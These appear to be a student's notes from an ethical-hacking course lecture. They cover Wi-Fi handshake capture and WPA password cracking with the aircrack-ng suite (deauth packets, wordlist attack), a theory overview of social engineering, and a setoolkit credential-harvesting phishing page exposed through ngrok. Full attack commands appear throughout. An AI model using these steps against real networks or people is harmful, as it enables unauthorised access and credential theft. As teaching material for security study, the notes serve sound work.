#WsCubeTech-CEH-notes

---
### What we'll learn 
> Lecture Name : More about Wi-Fi Hacking & Social Engineering
> - more about wifi-hacking - from 30th lecture
> 1) Practical Work : more about wifi-hacking & wifi password cracking
> 2) Theory : Social Engineering
> 3) Practical Work : phishing of SE

---
### Practical Work : more about wifi-hacking & wifi password cracking
- for Previous STEPS - go in 30th lecture
- STEP 5.3 : to select the specific target router , <br>run `airodump-ng wlan0 --bssid 82:A3:99:A8:CD:9B --channel 11 --write sohag`
	- output <br>![[31_lecture-0-M3.jpg | 500]]
	- in output , now this command will start focusing only on this particular wifi-router device <br>- "`airodump-ng wlan0`" : this command was showing those wifi-router devices which are in our wifi-adapter's network range ✔ <br>- now the command (which we just run) - selected that specific wifi-router device , <br>so this command will show only those devices - which are connected with this wifi-router device (which we selected) ✔
	- in output , <br>Q : here , what's STATION ✔<br>Ans : in STATION column , that device's MAC address showing which is connected with the router (which we selected)<br>![[31_lecture-1-M3.jpg | 500]]
- till yet , we selected the target <br>- now we need to disconnect that router , for this we have 2 ways : ✔<br>1st way) : either wait for someone to connect with that wifi-router device <br>2nd way) : OR disconnect that wifi-router device itself <br>- Advice : so we'll disconnect that wifi-router device , instead of waiting for someone to connect with the targeted wifi-router device ✔
- STEP 6 : sending a de-authentication packet to the targeted wifi-router device - in order to disconnect those devices <br>which are connected to that targeted wifi-router device
	- for further STEPS : [Wi-Fi Networking 💀: Penetration and Security of Wireless Networks - Full Tutorial - YouTube](https://www.youtube.com/watch?v=kYcFXYVZiBQ&ab_channel=WsCubeTech) ✔
	- Eg of command : `aireplay-ng --deauth 20 -a BC:A3:99:A8:CD:9A -c 3E:80:A7:49:A0:70 wlan0` <br>Q : what this command will do ✔ <br>Ans : <br>> "aireplay-ng" : will disconnect that device which is connected with that targeted wifi-router device <br>> "--deauth" : means disconnecting that device (from that targeted wifi-router device) via sending de-auth packet to that device <br>> "20" : means is a total no. of de-auth packets - like u can define how many de-auth packets u want to send <br>> `-a <mac-address-of-router>` : in -a , define the MAC address of targeted wifi-router device <br>> `"-c <mac-address-of-device>"` : in -c , define the MAC address of a device (which is connected to the targeted wifi-router device) <br>> "wlan0" : means the wifi-adapter interface device via which that attacker gonna do all these
	- run `aireplay-ng --deauth 100 -a 7C:A9:6B:50:5C:C5 -c 10:07:B6:A0:7A:CC wlan0` <br>- now keep an eye on "Lost" column - which will tell that how many no. of packets got lost from that targeted user's device<br>- then once "WPA handshake mac-address-of-our-wifi-adapter" message comes - then press "CTRL + C" <br>cuz our motive to disconnect that user's device - so that he/she can re-connect <br>to the targeted wifi-router via re-typing the password ✔<br>- if not pressed "CTRL + C" - then those de-auth packets will keep that targeted user disconnected from the targeted wifi-router ✔<br>- in this command , we're sending 100 de-authentication packets
	- output : now de-authentication packets start sending to that client <br>- & in the process of "`airodump-ng wlan0 --bssid 82:A3:99:A8:CD:9B --channel 11 --write sohag`" <br>![[31_lecture-2-M3.jpg | 500]]
		- in output , wlan0 interface is showing down - means that user is disconnected ✔<br>- now wait for that user to connect again - then message get "`WPA handshake <mac-address-of-our-own-wifi-adapater>`" <br>- means a handshake file is captured <br>![[31_lecture-3-M3.jpg | 500]]
		- now we got the handshake file - & via using this handshake file , we can apply wifi password cracking
	- till yet all we were doing Wifi-Hacking , now let's do wifi password cracking <br> - cuz after wifi-hacking completed - then comes wifi-password cracking 
	- STEP 6.1 : cd `/home/kali` , that file saved as `sohag.cap` - which contain the password that user's wifi ✔
		- `imp Note ⭐` : ✔ <br>1) if that targeted wifi-router/phone device was based on old wifi-technology/hotspoit <br>- then the data which are getting send/received are not strongly encrpted = means the handshake file is not strongly encrypted<br>- then in this situation , we just need to run this command  "`aircrack-ng sohag.cap`" & hit enter <br>then we'll get the password <br>![[31_lecture-4-M3.jpg | 500]]
		- in output , WPA2 which is a good encrypted is applied on that wifi-router device <br>- so we need to decrypt , so to crack those hashes (which is a encrypted password) - we need to use a password word list ✔
		- we'll use a word list (which contain common passwords) - which is useful sometimes <br>- but if that common word list password - not working - 
		- link of a 1000000 passwords word list : <br>[SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt at master · danielmiessler/SecLists · GitHub](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt)
	- STEP 6.2 : using a common word list passwords , run `aircrack-ng sohag.cap -w 10-million-password-list-top-1000000.txt` <br>- so these passwords are leaked passwords <br>- output : got the password<br>![[31_lecture-5-M3.jpg | 500]]
	- "aircrack-ng" : used to crack 802.11 WEP and WPA/WPA2-PSK keys ✔

### Theory : Social Engineering
- About : Social Engineering
	- Eg : u got calls like "u got the offer/lottery/etc" - so these people who're doing these kindof process = social Engineering
	- means it's a process which is used to play with mind (of normal human people) - in order to perform this attack , Eg : ✔<br>1) Psychological manipulation : by using this attack , attacker get the details of OTP , Bank of a victim<br>2) Confidential Information : <br>- eg : they call u - that they're calling u from ur bank & they say - ur debit card is not updated or it's block <br>so they say to unblock ur card - share OTP , aadhar card , account no. <br>3) Different SE tech : they use different SE technologies <br>4) Human Hacking : means SE aka human hacking cuz - they hack human's mind
- Types of SE
	- 3 types : <br>1) Human based <br>2) Computer based <br>3) Mobile based
	- Explanation of those 3 types : <br>- Human based : means SE done via a human aka human-based SE <br>- Computer based : means SE done via a computer aka computer-based SE <br>- Mobile based : means SE done via a mobile aka mobile-based SE
	- in Human-based SE ✔
		- Eavesdropping : 
			- means attacker hide himself/herself - then listening voice of a targeted victim
			- means to listen secretly to other people talking <br>- cuz might be that victim sharing confidential information (like bank details , etc) on a call , <br>so that attacker can get those information
		- Vishing :
			- means using someone's identity - & tell that person - that u're the actual person (But in reality - u're not)
			- Eg 1 : in this class , Saurabh - then sir is calling to other students & telling "i'm Saurabh & i need recordings" <br>so other students (except Saurabh) will give "class recordings" - so here Sir - used the Saurabh's identify<br>- Eg 2 : so same with - those people call u - they tell themselves - they're from ur bank & ur card will get block , <br>so victim shared OTP, bank details <br>Q : here those people - which identity they have used <br>Ans : Bank
			- Conclusion :  u're hiding ur actual identity & u're using someone else identity as urs <br>& presenting urself towards other people - to tell "i'm the that actual person" ✔
		- Shoulder Surfing :
			- means let's say u're Surfing something on ur phone/lapi & a person/attacker watching u from ur behind
			- Eg : u're in ATM & typing ur pin no. - & someone watching ur pin no. from ur behind , <br>due to this , ur information is getting leak OR attacker will get that information
		- Piggybacking :
			- means if an authorized person giving a "employee entry-pass" secretly (of a company) to an unauthorized person <br>& that authorized person showing data (which is not allowed for unauthorized person) to that unauthorized person ,<br>in this situation , that authorized person taking advantage - of being an authorized employee of a company
			- Eg 1 : assume Sir is a authorized employee of "wsbcubetech" company - & a person "Sohag" - who's not authorized <br>- & in "wsbcubetech" company , there's a room where many important data kept <br>- now Sir can go inside that room (cuz he's authorized person) - but Sohag can't go inside it (cuz he's not authorized) , <br>due to this - behind the scene of the company , Sir can bring that person (who's un-authorized) - inside that room <br>which is not allowed for un-authorized people
			- Conclusion : <br>- means u're a authorized person of a company - & a person is not authorized ,<br>& secretly u're bring that person - inside a room/place (which contain vital documents/data/etc) , <br> which is not allowed for un-authorized person - aka piggbacking
		- Dumpster Diving : 
			- Dumpster = means kindof dustbin/trash-bin
			- Eg 1 : sometimes people go in ATM - they bring-out the slip - then they throw in a dustbin <br>Eg : 2 : people travel in flight - then they throw their flight-ticket in fight-itself/dustbin <br>- but in these flight-ticket , atm-slip , etc - contain many information
			- so anything which is waste for that normal person - but when attacker do I.G from those waste/trash-bin <br>& attacker getting information a targeted victim - aka Dumpster Diving
			- Conclusion : <br>means when someone/attacker doing I.G (about a targeted victim) from those waste/trash-bin = Dumpster Diving
	- in Computer-based SE
		- These are SE which is used in a Victim's PC/lapi - in order to hack the Victim's PC/lapi
		- Pop-up windows :
			- Eg : when u some websites - which shows pop-up (like a ad - ur system is not secure , download anti-virus) <br>- & when u click on that pop-up - then either virus or malware will get download in ur system <br>& that virus will give complete access to the attacker
			- Eg : might that pop-up contain ransomware or sometimes those popup are like "download this anti-virus for free" <br>- which might be virus
			- mine thought : This only happens - if u're visiting on random websites (which are unknown or not secured)
		- Hoax Letters : 
			- it's kindof Spam mails - which used to make u afraid or decreasing ur productivity <br>Eg : u got the mail like ur got a lottery or that mail is a fake
			- Haox = means fake/cheating someone
			- Conclusion of Hoax Letters : <br>- in it , mostly u'll get fake mails - in order to decrease ur productivity <br>- Eg : there's a tool/software (which is premium like YT) - & if a ad comes on it - then u'll feel bad <br>- this will use ur processor , RAM , internet <br>- only motive of it : to make u afraid + decrease productivity + take ur's body & devices resources
			- Q : is there any role of payload in it <br>Ans : No
		- Chain Letters : 
			- Eg : attacker will send messages (like emotional messages , giving a gift message , bonus/offer/coupon , ec) <br>- so via these messages/mails , they will make u too emotional - so that u can take instant/impulsive action <br>- means they do emotional black-mail/messages - in order to make u for taking impulsive actions
		- Instant Chat Messenger : 
			- in it , attacker communicate directly to the victim person - in order to take out the information about Victim
		- Spam Email : 
			- Spam Email = Hoax letters + Chain letters
			- Eg : let's say a Victim was applying for a job in wscuebtech <br>- & attacker sent a mail with a file (like "wscubetechofferletter.exe") to that Victim <br>- then Victim couldn't able to see the "file extension" except that long name <br>- we (as a cyber security) - know exe = executable file <br>so that file will get executed - once victim downloaded file
		- Scareware : 
			- it's kindof pop-up-windows
			- in pop-up-windows , websites showing pop-up (like - download anti-virus to secure the PC) <br>but in Scareware , u'll also get pop-up - but those pop-up (like ur system is not secure , etc)
			- means u'll get scary pop-ups - in order to make u for taking impulsive action - then u'll click on it & download <br>- but those popup contain virus
			- scareware = showing scary popup to make u afraid 
	- Mobile-based SE
		- Publishing Malicious Apps : 
			- Eg : a group of attackers make a apps (based on requirement of people - like some play games , some read books , <br>downloading free books , etc) 
			- so those attackers will make a attractive app - then they will deploy/upload in 3rd-party playstore/website <br>- then if any Victim search - then the Victim will see that attractive app & downloaded it <br>- once that app installed in Victim's phon/PC - then virus will be installed (which will share info with the attacker)
		- Repackaging Legitimate Apps : 
			- Eg : there are many legitimate apps (like ZOOM , freefire , GTA5 , pubg & some paid apps (which are not free) , etc)
			- let's say a attacker will buy a that paid app - then he/she will open code of that app <br>- then he/she will write malicious code (in order to get Victim's information) <br>then he/she will freely upload that app on 3rd-party playstore/website <br>- so if a Victim search "free GTA5 game" - then that victim will downloaded it (which contains malicious code) <br>then the attacker will get all the information about that victim
		- Using Fake Security Apps
			- Eg : a attacker will send a link - to targeted victim/s - to damage little bit to Victim/s's device <br>- now let's say that victim opened his banking app - then that attacker's link will show a popup (like this app is not safe <br>to make it safe - download this anti-virus)
			- here attacker <br>1st) attacker sent a link to targeted victim's device <br>2nd) then attacker shown a popup
			- so once a group of Victims downloaded that anti-virus as a security app (which is actually not a security app) <br>- assume all those victims downloaded that anti-virus
			- now here attacker did a 2 ways attack <br>1st) via link <br>2nd) makes those victims afraid via make them to download a malicious app
			- if those victims put the 2FA security in that app - then 2FA security will get bypass by that malicious app <br>- & via that link - attacker also ur ID & password of ur banking app <br>cuz when u got that link - then u loggedIn ur banking app
			- Might be that malicious app is a remote control or keylogger
		- Smishing (SMS Phishing)
			- Smishing = means manipulating human's mind
			- Eg : giving offer/bonus/lottery via sms to vicitim's phone = aka Smishing - in order to attack on Victim's phone
- these are different techniques to implement SE
- Note : we can't do practical of SE - cuz its depends on situation ✔<br>Eg : SE is a technique  - like how u can do I.G via a unknown person <br>- u have to know nature of that unknown person + it's also depends on situation of that unknown person

### Practical Work : phishing of SE
> It's a small practical of phishing of SE
- STEP 0 : `sudo su`
- STEP 1 : cd `/home/kali/Downloads`
- we'll use a inbuilt tool i.e "`setoolkit`" - which is used for phishing <br>eg : attacking on a website , getting someone's password , to access anything in victim's device
- STEP 2 : run `setoolkit`
	- output : <br>![[31_lecture-6-M3.jpg | 500]]
	- STEP 2.1 : which attack u want to perform , press `1` - for SE attacks , output : <br>![[31_lecture-7-M3.jpg | 500]]
	- STEP 2.2 : what type of SE attack u want , press `2` - for Website Attack Vectors , output : <br>![[31_lecture-8-M3.jpg | 500]]
	- STEP 2.3 : for what purpose u want to perform "Website Attack Vectors" SE attack , press `3` <br>- cuz we want credential of a victim <br>- output : 3 options will shown - 1) Web Templates , 2) Site Cloner , 3) Custom Import
	- in output of STEP 2.3 : <br>1st option) web templates : use templates which are already made<br>2nd option) Site Cloner : means it'll take URL of a website & then clone that actual website <br>3rd option) Custom Import : it'll import by itself
	- STEP 2.4 : press `1` , output : <br>![[31_lecture-9-M3.jpg | 500]]
	- in STEP 2.4 output : showing which IP do u want - in order to make that inbuilt template
	- STEP 2.5 : press enter - cuz we want that IP bydefault , output : <br>![[31_lecture-10-M3.jpg | 500]]
	- in STEP 2.5 output : showing which template do u want to make 
	- STEP 2.6 : press `2` - to make google template , output : <br>![[31_lecture-11-M3.jpg | 500]]
	- in STEP 2.6 Output : it's telling that it deployed the "google template" on Port 80
- STEP 3 : checking the "google template" on Port 80
	- STEP 3.1 : in firefox , run `localhost:80` <br>output : if "Apache2 hacking Page" shown - then 1st turn off ur apache service - via run the command `service apache2 stop`<br>- once the apache service got closed - then that template will get uploaded on the same port<br>STEP 3.1.1 : in firefox , run `localhost:80` <br>output : if "Apache2 hacking Page" still showing - then open that template manually <br>![[31_lecture-12-M3.jpg | 500]]
	- in output , that red marked message comes - then means that template deployed on Port 80 by it successfully
	- STEP 3.2 : `sudo su` -> `cd /home/kali/Downloads` -> now start ngrok `./ngrok http 80` , output <br>![[31_lecture-13-M3.jpg | 500]]
	- STEP 3.4 : copy the link -> paste in the browser -> click "visit Site" btn -> output : <br>![[31_lecture-14-M3.jpg | 500]] <br>![[31_lecture-15-M3.jpg | 500]]
	- in output , those green messages - means a user came inside the link
	- STEP 3.5 : write email as `test@gmail.com` & password as "password" -> click on SignIn -> click "Send anyway" btn , output : <br>![[31_lecture-16-M3.jpg | 500]]
	- in output : it directly redirected that Victim to Google <br>- & attacker got the username & password <br>![[31_lecture-17-M3.jpg | 500]]
- this is a example of one of the type of SE i.e phishing

---
### Homework
1. read more about `setoolkit` tool & see more options on it

---
### End of the lecture (Doubts) :
- Q : what is PSK in WPA : [Exploring WPA-PSK and WiFi Security - Portnox](https://www.portnox.com/cybersecurity-101/wpa-psk/#section1)
- Q : what to do if a common word list passwords not working to crack the password after running aircrack-ng
	- Ans : [what to do if a common word list passwords not working...](https://www.perplexity.ai/search/what-to-do-cArbwTv0T7G4ZZg9TzLIsw?s=u)
	- 1st : **Verify the Wordlist**<br>2nd : **Wordlist Quality** <br>3rd : **Password Format** <br>4th : **Custom Wordlist** <br>5th : **Brute Force or Mask Attack**
- Q : what kind of operations attacker can perform via phishing attack
	- Ans : [operations attacker can perform via phishing attack](https://www.perplexity.ai/search/whats-the-use-X7dgYlDpRNS02IaUOluMIQ?s=u)
